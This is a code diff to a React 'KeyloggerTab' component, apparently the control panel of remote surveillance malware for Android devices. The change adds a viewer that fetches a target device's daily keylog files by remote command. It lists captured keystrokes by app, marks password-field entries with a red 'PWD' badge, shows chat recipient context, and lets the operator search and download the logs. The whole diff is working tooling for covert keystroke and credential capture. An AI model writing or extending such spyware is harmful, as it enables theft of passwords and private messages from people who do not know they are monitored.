@@ -34,6 +34,32 @@ function dedupeByTimestampAndText(entries) {
   });
 }
 
+/**
+ * Per-day keylog files are JSONL — one entry object per line. Falls back to raw
+ * text lines when a line is not valid JSON so a partially written file still
+ * renders instead of coming up empty.
+ */
+function parseJsonl(raw) {
+  const lines = (raw || '').split('\n').filter(l => l.trim().length > 0);
+  const entries = [];
+  for (const line of lines) {
+    try {
+      const obj = JSON.parse(line);
+      entries.push(typeof obj === 'object' && obj !== null ? obj : { text: String(obj) });
+    } catch (_) {
+      return { parsed: false, entries: lines.map(l => ({ text: l })) };
+    }
+  }
+  return { parsed: true, entries };
+}
+
+function decodeBase64(b64) {
+  const binary = atob(b64);
+  const bytes = new Uint8Array(binary.length);
+  for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+  return new TextDecoder('utf-8').decode(bytes);
+}
+
 export default function KeyloggerTab({ device, sendCommand, results, keylogPushEntries }) {
   const deviceId  = device.deviceId;
   const isOnline  = device.isOnline;
@@ -47,8 +73,14 @@ export default function KeyloggerTab({ device, sendCommand, results, keylogPushE
   const logEndRef = useRef(null);
   const seenResultIds = useRef(new Set());
 
-  const downloadBase64Text = (b64, filename) => {
-    const raw = atob(b64);
+  // Single-file viewer window. `date` is the file being shown; `raw` keeps the
+  // decoded text so the modal can offer its own Download button.
+  const [fileView, setFileView]   = useState(null);
+  const [viewBusy, setViewBusy]   = useState(false);
+  const [viewFilter, setViewFilter] = useState('');
+  const pendingViewDate = useRef(null);
+
+  const downloadText = (raw, filename) => {
     const blob = new Blob([raw], { type: 'text/plain' });
     const url = URL.createObjectURL(blob);
     const a = document.createElement('a');
@@ -58,7 +90,24 @@ export default function KeyloggerTab({ device, sendCommand, results, keylogPushE
     URL.revokeObjectURL(url);
   };
 
+  const downloadBase64Text = (b64, filename) => {
+    downloadText(decodeBase64(b64), filename);
+  };
+
   useEffect(() => {
+    // A timed-out/failed request carries no response — clear the pending viewer
+    // marker so it can't latch onto the next unrelated download_keylog_file.
+    results.forEach(r => {
+      if (r.command !== 'download_keylog_file' || r.success) return;
+      if (seenResultIds.current.has(r.id)) return;
+      seenResultIds.current.add(r.id);
+      const pendingDate = pendingViewDate.current;
+      if (!pendingDate) return;
+      pendingViewDate.current = null;
+      setViewBusy(false);
+      setFileView({ date: pendingDate, error: r.error || 'Request failed or timed out' });
+    });
+
     const relevant = results.filter(r =>
       (r.command === 'get_keylogs' || r.command === 'list_keylog_files' || r.command === 'download_keylog_file') &&
       r.success && r.response
@@ -75,8 +124,30 @@ export default function KeyloggerTab({ device, sendCommand, results, keylogPushE
         if (r.command === 'list_keylog_files' && data.files) {
           setKeylogFiles(data.files);
         }
-        if (r.command === 'download_keylog_file' && data.base64) {
-          downloadBase64Text(data.base64, `keylogs_${data.date}.txt`);
+        if (r.command === 'download_keylog_file') {
+          // The same command backs both Download and View. When a view request
+          // is pending for this exact date, render it in its own window instead
+          // of saving it to disk.
+          if (pendingViewDate.current && pendingViewDate.current === data.date) {
+            pendingViewDate.current = null;
+            setViewBusy(false);
+            if (data.base64) {
+              const raw = decodeBase64(data.base64);
+              const { parsed, entries } = parseJsonl(raw);
+              setFileView({
+                date: data.date,
+                raw,
+                entries,
+                parsed,
+                size: data.size ?? raw.length,
+              });
+              setViewFilter('');
+            } else {
+              setFileView({ date: data.date, error: data.error || 'File is empty' });
+            }
+          } else if (data.base64) {
+            downloadBase64Text(data.base64, `keylogs_${data.date}.txt`);
+          }
         }
       } catch (_) {}
     });
@@ -124,8 +195,41 @@ export default function KeyloggerTab({ device, sendCommand, results, keylogPushE
   }, [combinedLogs.length, autoScroll]);
 
   const downloadDay = (date) => {
+    // Clearing the pending-view marker guarantees this response is saved to
+    // disk even if a viewer window for the same day is still in flight.
+    pendingViewDate.current = null;
     sendCommand(deviceId, 'download_keylog_file', { date });
   };
+
+  // Fetches that single day's file and opens it in its own viewer window.
+  const openFileView = (date) => {
+    pendingViewDate.current = date;
+    setViewBusy(true);
+    sendCommand(deviceId, 'download_keylog_file', { date });
+  };
+
+  const closeFileView = () => {
+    pendingViewDate.current = null;
+    setViewBusy(false);
+    setFileView(null);
+    setViewFilter('');
+  };
+
+  useEffect(() => {
+    if (!fileView) return;
+    const onKey = e => { if (e.key === 'Escape') closeFileView(); };
+    window.addEventListener('keydown', onKey);
+    return () => window.removeEventListener('keydown', onKey);
+  }, [fileView]);
+
+  const viewEntries = useMemo(() => {
+    if (!fileView?.entries) return [];
+    const q = viewFilter.trim().toLowerCase();
+    if (!q) return fileView.entries;
+    return fileView.entries.filter(e =>
+      `${e.appName || ''} ${e.packageName || ''} ${e.eventType || ''} ${e.text ?? e.content ?? ''}`
+        .toLowerCase().includes(q));
+  }, [fileView, viewFilter]);
 
   return (
     <div className="keylogger-tab">
@@ -255,16 +359,106 @@ export default function KeyloggerTab({ device, sendCommand, results, keylogPushE
                     </button>
                     <button
                       className="kl-btn"
-                      onClick={() => { sendCommand(deviceId, 'get_keylogs', { limit: 500 }); setViewMode('live'); }}
-                      disabled={!isOnline}
+                      onClick={() => openFileView(f.date || f.name)}
+                      disabled={!isOnline || viewBusy}
+                      title="Open this file in a viewer window"
                     >
-                      👁 View
+                      {viewBusy && pendingViewDate.current === (f.date || f.name) ? '…' : '👁 View'}
                     </button>
                   </div>
                 </div>
               ))}
             </div>
           )}
+        </div>
+      )}
+
+      {/* Single-file viewer — shows only the selected day's keylog file */}
+      {(fileView || viewBusy) && (
+        <div className="kl-file-modal" onMouseDown={e => { if (e.target === e.currentTarget) closeFileView(); }}>
+          <div className="kl-file-modal-box">
+            <div className="kl-file-modal-head">
+              <span className="kl-file-modal-title">📄 {fileView?.date || 'Loading…'}</span>
+              {fileView?.size != null && (
+                <span className="kl-file-modal-meta">
+                  {(fileView.size / 1024).toFixed(1)} KB · {viewEntries.length}
+                  {viewFilter.trim() ? ` / ${fileView.entries.length}` : ''} entries
+                  {fileView.parsed ? '' : ' • raw'}
+                </span>
+              )}
+              <button className="kl-btn" onClick={closeFileView} title="Close (Esc)">✕</button>
+            </div>
+
+            {viewBusy && !fileView ? (
+              <div className="kl-file-modal-body kl-empty">
+                <div style={{ fontSize: 32 }}>⏳</div>
+                <div>Fetching file from device…</div>
+              </div>
+            ) : fileView?.error ? (
+              <div className="kl-file-modal-body kl-empty">
+                <div style={{ fontSize: 32 }}>⚠️</div>
+                <div>{fileView.error}</div>
+              </div>
+            ) : (
+              <>
+                <div className="kl-file-modal-tools">
+                  <input
+                    className="kl-file-modal-search"
+                    placeholder="Search this file…"
+                    value={viewFilter}
+                    onChange={e => setViewFilter(e.target.value)}
+                    autoFocus
+                  />
+                </div>
+                <div className="kl-file-modal-body">
+                  {viewEntries.length === 0 ? (
+                    <div className="kl-empty">
+                      <div style={{ fontSize: 32 }}>🔍</div>
+                      <div>{viewFilter.trim() ? 'No matching entries' : 'This file is empty'}</div>
+                    </div>
+                  ) : (
+                    viewEntries.map((entry, i) => (
+                      <div key={`${entry.timestamp}-${entry.packageName}-${i}`} className="kl-entry">
+                        <div
+                          className="kl-app-badge"
+                          style={{ background: getAppColor(entry.packageName) + '22', borderColor: getAppColor(entry.packageName) + '66', color: getAppColor(entry.packageName) }}
+                        >
+                          {getAppShortName(entry.packageName)}
+                        </div>
+                        <div className="kl-entry-body">
+                          <span className="kl-app-name">{(entry.appName || entry.packageName || '—').split('.').pop()}</span>
+                          {entry.eventType && (
+                            <span className="kl-file-event-type">{entry.eventType}</span>
+                          )}
+                          {entry.screenTitle && (
+                            <span title="Recipient / chat context" style={{ fontSize: 11, background: '#3b82f622', color: '#60a5fa', border: '1px solid #3b82f666', borderRadius: 4, padding: '1px 6px', marginRight: 4, fontWeight: 600 }}>→ {entry.screenTitle}</span>
+                          )}
+                          {entry.eventType === 'PASSWORD_FOCUS' && (
+                            <span style={{ fontSize: 11, background: '#ef444422', color: '#ef4444', border: '1px solid #ef444466', borderRadius: 4, padding: '1px 5px', marginRight: 4, fontWeight: 700, letterSpacing: 0.5 }}>🔑 PWD</span>
+                          )}
+                          <span className="kl-text kl-text-wrap">{entry.text ?? entry.content ?? entry.typedText ?? ''}</span>
+                        </div>
+                        <div className="kl-ts">{entry.timestamp || '—'}</div>
+                      </div>
+                    ))
+                  )}
+                </div>
+                <div className="kl-file-modal-foot">
+                  <span className="kl-file-modal-meta">Viewing keylogs_{fileView?.date}.txt only</span>
+                  <div className="kl-file-modal-foot-actions">
+                    <button
+                      className="kl-btn kl-btn-dl"
+                      disabled={!fileView?.raw}
+                      onClick={() => fileView?.raw && downloadText(fileView.raw, `keylogs_${fileView.date}.txt`)}
+                    >
+                      ⬇ Download this file
+                    </button>
+                    <button className="kl-btn" onClick={closeFileView}>Close</button>
+                  </div>
+                </div>
+              </>
+            )}
+          </div>
         </div>
       )}
     </div>
